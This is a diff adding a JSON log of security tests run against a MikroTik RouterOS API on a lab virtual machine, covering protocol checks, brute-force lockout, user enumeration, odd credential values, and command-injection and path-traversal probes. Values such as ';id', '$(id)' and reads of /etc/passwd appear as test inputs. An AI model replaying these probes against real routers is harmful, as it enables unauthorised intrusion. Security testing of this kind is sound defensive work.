@@ -1,0 +1,2998 @@
+{
+  "metadata": {
+    "script": "attack_ros_api.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": 4,
+    "start_time": "2026-02-15T23:16:03.372297",
+    "end_time": "2026-02-15T23:18:23.590153",
+    "total_tests": 241,
+    "anomalies": 4,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "1h8m24s",
+    "final_health": {
+      "alive": false
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "protocol_implementation",
+      "name": "length_encode_decode_roundtrip",
+      "description": "Round-trip encode/decode for 11 boundary values",
+      "result": "11/11 passed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.376295"
+    },
+    {
+      "id": 2,
+      "category": "protocol_implementation",
+      "name": "word_encode_decode_roundtrip",
+      "description": "Round-trip encode/decode for 9 words",
+      "result": "9/9 passed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.376295"
+    },
+    {
+      "id": 3,
+      "category": "protocol_implementation",
+      "name": "sentence_encode_decode_roundtrip",
+      "description": "Round-trip for 4 sentences",
+      "result": "4/4 passed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.376295"
+    },
+    {
+      "id": 4,
+      "category": "protocol_implementation",
+      "name": "login_api_8728",
+      "description": "Login to API port 8728 with admin credentials",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.380293",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 5,
+      "category": "protocol_implementation",
+      "name": "login_api_ssl_8729",
+      "description": "Login to API-SSL port 8729 with admin credentials",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 6,
+      "category": "protocol_implementation",
+      "name": "login_user_admin",
+      "description": "Login as admin (group=full)",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 7,
+      "category": "protocol_implementation",
+      "name": "login_user_testfull",
+      "description": "Login as testfull (group=full)",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 8,
+      "category": "protocol_implementation",
+      "name": "login_user_testread",
+      "description": "Login as testread (group=read)",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 9,
+      "category": "protocol_implementation",
+      "name": "login_user_testwrite",
+      "description": "Login as testwrite (group=write)",
+      "result": "success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "response": "!done"
+      }
+    },
+    {
+      "id": 10,
+      "category": "protocol_implementation",
+      "name": "cmd_system_resource_print",
+      "description": "Get system resource info",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 2,
+        "first": "!re =uptime=1h8m24s =version=7.20.8 (long-term)"
+      }
+    },
+    {
+      "id": 11,
+      "category": "protocol_implementation",
+      "name": "cmd_system_identity_print",
+      "description": "Get system identity",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 2,
+        "first": "!re =name=MikroTik"
+      }
+    },
+    {
+      "id": 12,
+      "category": "protocol_implementation",
+      "name": "cmd_system_routerboard_print",
+      "description": "Get routerboard info",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 3,
+        "first": "!trap =category=0 =message=no such command or directory (routerboard)"
+      }
+    },
+    {
+      "id": 13,
+      "category": "protocol_implementation",
+      "name": "cmd_user_print",
+      "description": "List users",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 14,
+        "first": "!re =.id=*1 =name=admin"
+      }
+    },
+    {
+      "id": 14,
+      "category": "protocol_implementation",
+      "name": "cmd_ip_address_print",
+      "description": "List IP addresses",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 3,
+        "first": "!re =.id=*2 =address=[REDACTED-INTERNAL-IP]/32"
+      }
+    },
+    {
+      "id": 15,
+      "category": "protocol_implementation",
+      "name": "cmd_interface_print",
+      "description": "List interfaces",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.580193",
+      "details": {
+        "reply_count": 3,
+        "first": "!re =.id=*2 =name=ether1"
+      }
+    },
+    {
+      "id": 16,
+      "category": "protocol_implementation",
+      "name": "cmd_system_package_print",
+      "description": "List packages",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.608179",
+      "details": {
+        "reply_count": 2,
+        "first": "!re =.id=*1 =name=routeros"
+      }
+    },
+    {
+      "id": 17,
+      "category": "protocol_implementation",
+      "name": "cmd_log_print",
+      "description": "Read system log",
+      "result": "data_received",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.616175",
+      "details": {
+        "reply_count": 25,
+        "first": "!re =.id=*0 =time=2026-02-16 22:20:05"
+      }
+    },
+    {
+      "id": 18,
+      "category": "protocol_implementation",
+      "name": "login_no_credentials",
+      "description": "Send /login with no attributes (probe challenge-response)",
+      "result": "!done =ret=09f262a30f9c80378561f635f540ba92",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.724121",
+      "details": {
+        "response": "!done =ret=09f262a30f9c80378561f635f540ba92"
+      }
+    },
+    {
+      "id": 19,
+      "category": "protocol_implementation",
+      "name": "cleartext_api_credentials",
+      "description": "API port 8728 transmits credentials in cleartext (no TLS)",
+      "result": "confirmed_cleartext",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.724121",
+      "details": {
+        "port": 8728,
+        "protocol": "RouterOS API (plaintext)",
+        "note": "Credentials sent as =name=... =password=... in cleartext"
+      }
+    },
+    {
+      "id": 20,
+      "category": "protocol_implementation",
+      "name": "ssl_cert_inspection",
+      "description": "Inspect TLS certificate and cipher on API-SSL port 8729",
+      "result": "TLS TLSv1.2, cipher=ADH-AES256-SHA256",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.912027",
+      "details": {
+        "cipher": [
+          "ADH-AES256-SHA256",
+          "TLSv1.2",
+          256
+        ],
+        "protocol": "TLSv1.2",
+        "cert_length": 0
+      }
+    },
+    {
+      "id": 21,
+      "category": "protocol_implementation",
+      "name": "simultaneous_connections",
+      "description": "5 simultaneous authenticated API sessions",
+      "result": "5/5 working",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:03.932017",
+      "details": {
+        "opened": 5,
+        "working": 5
+      }
+    },
+    {
+      "id": 22,
+      "category": "protocol_implementation",
+      "name": "keepalive_empty_sentence",
+      "description": "Session survives empty sentence (keepalive)",
+      "result": "session_alive",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:04.943511",
+      "details": {
+        "response": "!re =name=MikroTik | !done"
+      }
+    },
+    {
+      "id": 23,
+      "category": "protocol_implementation",
+      "name": "error_message_format",
+      "description": "Inspect error response format for invalid command",
+      "result": "error_attrs: ['category', 'message']",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:04.943511",
+      "details": {
+        "error_attributes": {
+          "category": "0",
+          "message": "no such command prefix"
+        },
+        "full_response": "!trap =category=0 =message=no such command or directory (nonexistent) | !trap =message=no such command prefix | !done"
+      }
+    },
+    {
+      "id": 24,
+      "category": "protocol_implementation",
+      "name": "tag_tracking",
+      "description": "Send 3 tagged commands, verify tag in replies",
+      "result": "tags_received: ['.tag=test0', '.tag=test0']",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:04.943511",
+      "details": {
+        "expected_tags": [
+          "test0",
+          "test1",
+          "test2"
+        ],
+        "received_tags": [
+          ".tag=test0",
+          ".tag=test0"
+        ]
+      }
+    },
+    {
+      "id": 25,
+      "category": "protocol_implementation",
+      "name": "system_resource_via_api",
+      "description": "Extract full system resource data via API",
+      "result": "version=7.20.8 (long-term), arch=x86_64",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:04.943511",
+      "details": {
+        "uptime": "1h8m25s",
+        "version": "7.20.8 (long-term)",
+        "build-time": "2026-01-30 09:17:54",
+        "factory-software": "7.1",
+        "free-memory": "835125248",
+        "total-memory": "1073741824",
+        "cpu": "AMD",
+        "cpu-count": "1",
+        "cpu-frequency": "4391",
+        "cpu-load": "47",
+        "free-hdd-space": "73125888",
+        "total-hdd-space": "93564928",
+        "write-sect-since-reboot": "4920",
+        "write-sect-total": "4920",
+        "architecture-name": "x86_64",
+        "board-name": "CHR innotek GmbH VirtualBox",
+        "platform": "MikroTik"
+      }
+    },
+    {
+      "id": 26,
+      "category": "protocol_implementation",
+      "name": "plaintext_vs_ssl_consistency",
+      "description": "Compare resource output: plaintext 8728 vs SSL 8729",
+      "result": "consistent=True",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.171397",
+      "details": {
+        "plain_version": "7.20.8 (long-term)",
+        "ssl_version": "7.20.8 (long-term)"
+      }
+    },
+    {
+      "id": 27,
+      "category": "protocol_implementation",
+      "name": "query_basic_query",
+      "description": "Basic query: ?name=admin",
+      "result": "response: !re =.id=*1 =name=admin | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.175395",
+      "details": {
+        "words": [
+          "/user/print",
+          "?name=admin"
+        ]
+      }
+    },
+    {
+      "id": 28,
+      "category": "protocol_implementation",
+      "name": "query_negation_query",
+      "description": "Negation query: ?#!",
+      "result": "response: !re =.id=*1 =name=admin | !re =.id=*2 =name=testfull | !re =.id=*3 =name=testread | !re =.id=*4 =nam",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.191387",
+      "details": {
+        "words": [
+          "/user/print",
+          "?name=nonexistent",
+          "?#!"
+        ]
+      }
+    },
+    {
+      "id": 29,
+      "category": "protocol_implementation",
+      "name": "query_comparison_query",
+      "description": "Comparison query: ?>address",
+      "result": "response: !re =.id=*2 =address=[REDACTED-INTERNAL-IP]/32 | !re =.id=*3 =address=[REDACTED-INTERNAL-IP]/24 | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.195385",
+      "details": {
+        "words": [
+          "/ip/address/print",
+          "?>address=0.0.0.0"
+        ]
+      }
+    },
+    {
+      "id": 30,
+      "category": "protocol_implementation",
+      "name": "query_has_query",
+      "description": "Has-property query: ?#name",
+      "result": "response: !re =.id=*2 =name=ether1 | !re =.id=*1 =name=lo | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.199383",
+      "details": {
+        "words": [
+          "/interface/print",
+          "?#name"
+        ]
+      }
+    },
+    {
+      "id": 31,
+      "category": "protocol_implementation",
+      "name": "proplist_filter",
+      "description": "Use .proplist to filter returned attributes",
+      "result": "response: !re =version=7.20.8 (long-term) =uptime=1h8m25s | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:05.207379",
+      "details": {
+        "response": "!re =version=7.20.8 (long-term) =uptime=1h8m25s | !done"
+      }
+    },
+    {
+      "id": 32,
+      "category": "authentication",
+      "name": "bruteforce_lockout_20_attempts",
+      "description": "20 rapid login failures to test account lockout",
+      "result": "no_lockout_detected",
+      "anomaly": true,
+      "timestamp": "2026-02-15T23:16:05.307329",
+      "details": {
+        "results_sample": [
+          {
+            "attempt": 1,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 2,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 3,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 4,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 5,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 18,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 19,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          },
+          {
+            "attempt": 20,
+            "success": false,
+            "response": "!trap =message=invalid user name or password (6)"
+          }
+        ]
+      }
+    },
+    {
+      "id": 33,
+      "category": "authentication",
+      "name": "timing_oracle_user_enumeration",
+      "description": "50 attempts each: valid user+wrong pw vs invalid user",
+      "result": "delta=1.5ms (valid=2.6ms, invalid=1.1ms)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.628167",
+      "details": {
+        "valid_user_avg_ms": 2.64,
+        "invalid_user_avg_ms": 1.12,
+        "delta_ms": 1.52,
+        "samples_valid": 50,
+        "samples_invalid": 50
+      }
+    },
+    {
+      "id": 34,
+      "category": "authentication",
+      "name": "auth_empty_username",
+      "description": "Empty username, valid password",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.632165"
+    },
+    {
+      "id": 35,
+      "category": "authentication",
+      "name": "auth_empty_password",
+      "description": "Valid username, empty password",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.636163"
+    },
+    {
+      "id": 36,
+      "category": "authentication",
+      "name": "auth_both_empty",
+      "description": "Both username and password empty",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.640161"
+    },
+    {
+      "id": 37,
+      "category": "authentication",
+      "name": "auth_null_in_username",
+      "description": "Null byte in username (admin\\x00root)",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.640161",
+      "details": {
+        "user_repr": "'admin\\x00root'",
+        "pass_repr": "'TestPass123'"
+      }
+    },
+    {
+      "id": 38,
+      "category": "authentication",
+      "name": "auth_null_in_password",
+      "description": "Null byte in password (truncation test)",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.644159",
+      "details": {
+        "user_repr": "'admin'",
+        "pass_repr": "'TestPass123\\x00extra'"
+      }
+    },
+    {
+      "id": 39,
+      "category": "authentication",
+      "name": "auth_null_prefix_user",
+      "description": "Null byte prefix in username",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.648157",
+      "details": {
+        "user_repr": "'\\x00admin'",
+        "pass_repr": "'TestPass123'"
+      }
+    },
+    {
+      "id": 40,
+      "category": "authentication",
+      "name": "auth_null_prefix_pass",
+      "description": "Null byte prefix in password",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.652155",
+      "details": {
+        "user_repr": "'admin'",
+        "pass_repr": "'\\x00TestPass123'"
+      }
+    },
+    {
+      "id": 41,
+      "category": "authentication",
+      "name": "auth_long_user_1kb",
+      "description": "1KB username",
+      "result": "rejected: !fatal too much input before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.656153"
+    },
+    {
+      "id": 42,
+      "category": "authentication",
+      "name": "auth_long_user_10kb",
+      "description": "10KB username",
+      "result": "rejected: !fatal too much input before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.660151"
+    },
+    {
+      "id": 43,
+      "category": "authentication",
+      "name": "auth_long_pass_1kb",
+      "description": "1KB password",
+      "result": "rejected: !fatal too much input before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.660151"
+    },
+    {
+      "id": 44,
+      "category": "authentication",
+      "name": "auth_long_pass_10kb",
+      "description": "10KB password",
+      "result": "rejected: !fatal too much input before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.664149"
+    },
+    {
+      "id": 45,
+      "category": "authentication",
+      "name": "auth_long_both_1kb",
+      "description": "1KB username + 1KB password",
+      "result": "rejected: !fatal too much input before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.668147"
+    },
+    {
+      "id": 46,
+      "category": "authentication",
+      "name": "auth_special_sql_injection",
+      "description": "Special chars in credentials: sql_injection",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.668147",
+      "details": {
+        "user_repr": "\"admin' OR '1'='1\""
+      }
+    },
+    {
+      "id": 47,
+      "category": "authentication",
+      "name": "auth_special_backslash",
+      "description": "Special chars in credentials: backslash",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.672145",
+      "details": {
+        "user_repr": "'admin\\\\'"
+      }
+    },
+    {
+      "id": 48,
+      "category": "authentication",
+      "name": "auth_special_unicode_homoglyph",
+      "description": "Special chars in credentials: unicode_homoglyph",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.676143",
+      "details": {
+        "user_repr": "'\u0430dmin'"
+      }
+    },
+    {
+      "id": 49,
+      "category": "authentication",
+      "name": "auth_special_percent_encoding",
+      "description": "Special chars in credentials: percent_encoding",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.676143",
+      "details": {
+        "user_repr": "'admin%00'"
+      }
+    },
+    {
+      "id": 50,
+      "category": "authentication",
+      "name": "auth_special_equals_in_value",
+      "description": "Special chars in credentials: equals_in_value",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.680141",
+      "details": {
+        "user_repr": "'admin=extra'"
+      }
+    },
+    {
+      "id": 51,
+      "category": "authentication",
+      "name": "auth_special_newline_in_user",
+      "description": "Special chars in credentials: newline_in_user",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.684139",
+      "details": {
+        "user_repr": "'admin\\nroot'"
+      }
+    },
+    {
+      "id": 52,
+      "category": "authentication",
+      "name": "auth_special_tab_in_user",
+      "description": "Special chars in credentials: tab_in_user",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.684139",
+      "details": {
+        "user_repr": "'admin\\troot'"
+      }
+    },
+    {
+      "id": 53,
+      "category": "authentication",
+      "name": "auth_special_cr_in_user",
+      "description": "Special chars in credentials: cr_in_user",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.688137",
+      "details": {
+        "user_repr": "'admin\\rroot'"
+      }
+    },
+    {
+      "id": 54,
+      "category": "authentication",
+      "name": "auth_no_password_attr",
+      "description": "Login with name but no password attribute",
+      "result": "login_success",
+      "anomaly": true,
+      "timestamp": "2026-02-15T23:16:11.788087"
+    },
+    {
+      "id": 55,
+      "category": "authentication",
+      "name": "auth_extra_extra_group",
+      "description": "Extra =group=full attribute",
+      "result": "accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.792085",
+      "details": {
+        "extra_attrs": [
+          "=group=full"
+        ]
+      }
+    },
+    {
+      "id": 56,
+      "category": "authentication",
+      "name": "auth_extra_extra_admin",
+      "description": "Extra =admin=true attribute",
+      "result": "accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.796083",
+      "details": {
+        "extra_attrs": [
+          "=admin=true"
+        ]
+      }
+    },
+    {
+      "id": 57,
+      "category": "authentication",
+      "name": "auth_extra_extra_disabled",
+      "description": "Extra =disabled=no attribute",
+      "result": "accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.800081",
+      "details": {
+        "extra_attrs": [
+          "=disabled=no"
+        ]
+      }
+    },
+    {
+      "id": 58,
+      "category": "authentication",
+      "name": "auth_extra_extra_policy",
+      "description": "Extra =policy= attribute",
+      "result": "accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.804079",
+      "details": {
+        "extra_attrs": [
+          "=policy=full,read,write"
+        ]
+      }
+    },
+    {
+      "id": 59,
+      "category": "authentication",
+      "name": "auth_extra_extra_unknown",
+      "description": "Unknown extra attribute",
+      "result": "accepted",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.808077",
+      "details": {
+        "extra_attrs": [
+          "=xyzzy=12345"
+        ]
+      }
+    },
+    {
+      "id": 60,
+      "category": "authentication",
+      "name": "concurrent_login_10",
+      "description": "10 concurrent login attempts",
+      "result": "10/10 succeeded",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.844059",
+      "details": {
+        "results": [
+          {
+            "idx": 0,
+            "success": true
+          },
+          {
+            "idx": 6,
+            "success": true
+          },
+          {
+            "idx": 3,
+            "success": true
+          },
+          {
+            "idx": 2,
+            "success": true
+          },
+          {
+            "idx": 1,
+            "success": true
+          },
+          {
+            "idx": 5,
+            "success": true
+          },
+          {
+            "idx": 4,
+            "success": true
+          },
+          {
+            "idx": 7,
+            "success": true
+          },
+          {
+            "idx": 8,
+            "success": true
+          },
+          {
+            "idx": 9,
+            "success": true
+          }
+        ]
+      }
+    },
+    {
+      "id": 61,
+      "category": "authentication",
+      "name": "retry_login_same_socket",
+      "description": "Login retry after failure on same socket",
+      "result": "first=fail, second=ok",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.852055",
+      "details": {
+        "first_response": "!trap =message=invalid user name or password (6)",
+        "second_response": "!done"
+      }
+    },
+    {
+      "id": 62,
+      "category": "authentication",
+      "name": "auth_swapped_attrs",
+      "description": "Login with name=password_value, password=username_value",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.856053"
+    },
+    {
+      "id": 63,
+      "category": "authentication",
+      "name": "auth_duplicate_name_attr",
+      "description": "Login with two =name= attributes (admin, testread)",
+      "result": "rejected: !trap =message=invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.856053",
+      "details": {
+        "response": "!trap =message=invalid user name or password (6)"
+      }
+    },
+    {
+      "id": 64,
+      "category": "authentication",
+      "name": "auth_password_before_name",
+      "description": "Login with =password= before =name= (reversed order)",
+      "result": "login_success",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.860051"
+    },
+    {
+      "id": 65,
+      "category": "authentication",
+      "name": "auth_uppercase_login",
+      "description": "Login with /LOGIN (uppercase command)",
+      "result": "rejected: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:11.864049"
+    },
+    {
+      "id": 66,
+      "category": "authentication",
+      "name": "auth_ssl_then_command",
+      "description": "Login on SSL port 8729, then execute command",
+      "result": "login_ok, cmd: !re =name=MikroTik | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.063949"
+    },
+    {
+      "id": 67,
+      "category": "authentication",
+      "name": "auth_error_message_content",
+      "description": "Error message content on wrong password (info disclosure check)",
+      "result": "message: invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.067947",
+      "details": {
+        "error_message": "invalid user name or password (6)",
+        "reveals_user_exists": false
+      }
+    },
+    {
+      "id": 68,
+      "category": "authentication",
+      "name": "auth_error_message_nonexistent",
+      "description": "Error message for nonexistent user (compare with valid user)",
+      "result": "message: invalid user name or password (6)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.071945",
+      "details": {
+        "error_message": "invalid user name or password (6)"
+      }
+    },
+    {
+      "id": 69,
+      "category": "command_injection",
+      "name": "inject_cmd_semicolon_id",
+      "description": "Semicolon injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.075943",
+      "details": {
+        "command": "'/system/resource/print;id'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 70,
+      "category": "command_injection",
+      "name": "inject_cmd_pipe_id",
+      "description": "Pipe injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.079941",
+      "details": {
+        "command": "'/system/resource/print|id'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 71,
+      "category": "command_injection",
+      "name": "inject_cmd_ampersand_id",
+      "description": "Ampersand injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.087937",
+      "details": {
+        "command": "'/system/resource/print&id'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 72,
+      "category": "command_injection",
+      "name": "inject_cmd_backtick_id",
+      "description": "Backtick injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.091935",
+      "details": {
+        "command": "'/system/resource/print`id`'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 73,
+      "category": "command_injection",
+      "name": "inject_cmd_dollar_paren_id",
+      "description": "Dollar-paren injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.099931",
+      "details": {
+        "command": "'/system/resource/print$(id)'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 74,
+      "category": "command_injection",
+      "name": "inject_cmd_newline_id",
+      "description": "Newline injection in command path",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.103929",
+      "details": {
+        "command": "'/system/resource/print\\nid'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 75,
+      "category": "command_injection",
+      "name": "inject_cmd_carriage_return",
+      "description": "Carriage return injection",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.107927",
+      "details": {
+        "command": "'/system/resource/print\\rid'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 76,
+      "category": "command_injection",
+      "name": "inject_cmd_double_ampersand",
+      "description": "Double ampersand injection",
+      "result": "safe: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.111925",
+      "details": {
+        "command": "'/system/resource/print&&id'",
+        "response": "!trap =message=no such command | !done"
+      }
+    },
+    {
+      "id": 77,
+      "category": "command_injection",
+      "name": "inject_cmd_redirect_out",
+      "description": "Redirect injection in command",
+      "result": "safe: !trap =message=no such command prefix | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.119921",
+      "details": {
+        "command": "'/system/resource/print>/tmp/pwned'",
+        "response": "!trap =message=no such command prefix | !done"
+      }
+    },
+    {
+      "id": 78,
+      "category": "command_injection",
+      "name": "inject_cmd_redirect_in",
+      "description": "Input redirect injection",
+      "result": "safe: !trap =message=no such command prefix | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.123919",
+      "details": {
+        "command": "'/system/resource/print</etc/passwd'",
+        "response": "!trap =message=no such command prefix | !done"
+      }
+    },
+    {
+      "id": 79,
+      "category": "command_injection",
+      "name": "inject_null_null_mid_path",
+      "description": "Null byte in middle of command path",
+      "result": "executed=no: !trap =category=0 =message=no such command or directory (system\u0000) | !trap =message=no such command p",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.131915",
+      "details": {
+        "command_repr": "'/system\\x00/resource/print'"
+      }
+    },
+    {
+      "id": 80,
+      "category": "command_injection",
+      "name": "inject_null_null_after_cmd",
+      "description": "Null byte appended to command",
+      "result": "executed=no: !trap =message=no such command | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.135913",
+      "details": {
+        "command_repr": "'/system/resource/print\\x00extra'"
+      }
+    },
+    {
+      "id": 81,
+      "category": "command_injection",
+      "name": "inject_null_null_before_cmd",
+      "description": "Null byte before command",
+      "result": "executed=no: !trap =message=no such command prefix | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.143909",
+      "details": {
+        "command_repr": "'\\x00/system/resource/print'"
+      }
+    },
+    {
+      "id": 82,
+      "category": "command_injection",
+      "name": "inject_traversal_etc_passwd",
+      "description": "Path traversal to /etc/passwd",
+      "result": "safe: !trap =category=0 =message=no such command or directory (..) | !trap =message=no such command prefix",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.151905",
+      "details": {
+        "command": "'/../../etc/passwd'"
+      }
+    },
+    {
+      "id": 83,
+      "category": "command_injection",
+      "name": "inject_traversal_system_traversal",
+      "description": "Path traversal via /system/../..",
+      "result": "safe: !trap =category=0 =message=no such command or directory (..) | !trap =message=no such command prefix",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.155903",
+      "details": {
+        "command": "'/system/../../../etc/passwd'"
+      }
+    },
+    {
+      "id": 84,
+      "category": "command_injection",
+      "name": "inject_traversal_dot_only",
+      "description": "Single dot in path",
+      "result": "safe: !trap =category=0 =message=no such command or directory (.) | !trap =message=no such command prefix ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.159901",
+      "details": {
+        "command": "'/system/./resource/print'"
+      }
+    },
+    {
+      "id": 85,
+      "category": "command_injection",
+      "name": "inject_traversal_double_dot",
+      "description": "Double dot traversal (same level)",
+      "result": "safe: !re =uptime=1h8m32s =version=7.20.8 (long-term) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.167897",
+      "details": {
+        "command": "'/system/../system/resource/print'"
+      }
+    },
+    {
+      "id": 86,
